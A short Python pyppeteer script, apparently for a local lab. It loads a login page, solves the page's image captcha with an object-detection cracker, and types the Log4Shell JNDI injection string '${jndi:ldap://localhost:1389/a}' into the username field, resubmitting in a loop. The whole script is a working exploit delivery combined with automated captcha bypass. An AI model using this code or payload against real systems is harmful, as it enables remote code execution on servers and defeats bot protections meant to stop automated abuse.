import asyncio
from typing import List
from pyppeteer import launch
import requests
import uuid

from Captcha_Solver.od_captcha_solver import ODCracker as Cracker
cracker = Cracker()
def crack_image(img_url):
    response = requests.get(img_url)
    img_data = response.content
    file_name = str(uuid.uuid4())
    file_path = './{}.png'.format(file_name)
    with open(file_path, 'wb') as handler:
        handler.write(img_data)
    
    res = cracker.crack(file_path)
    return res

async def run_cracking(page):
    captcha_img = await page.querySelector("#captcha_img")
    captcha_input = await page.querySelector("#captcha")
    email_input = await page.querySelector('[name="uname"]')
    password_input = await page.querySelector('[name="password"]')

    await asyncio.sleep(1)
    text = "${jndi:ldap://localhost:1389/a}"
    await email_input.type(text)
    await password_input.type("behx")
    
    src = await captcha_img.getProperty('src')
    img_path = await src.jsonValue()
    value_text = crack_image(img_path)
    await captcha_input.type(value_text)
    # await asyncio.sleep(0.5)
    captcha_img = await page.querySelector("#captcha_img")
    linkHandlers = await page.xpath('//*[@id="captcha-form"]/button')
    # print(linkHandlers)
    await linkHandlers[0].click()
    
    await asyncio.sleep(1)
    url = page.url
    if 'login' in url:
        return
    else:
        await run_cracking(page)


async def main():
    browser = await launch({"headless": False, "args": ["--start-maximized"]})
    page = await browser.newPage()
    await page.setViewport({"width": 1600, "height": 900})
    await page.goto("http://0.0.0.0:8080/")
    await run_cracking(page)
        

asyncio.get_event_loop().run_until_complete(main())
asyncio.get_event_loop().run_forever()
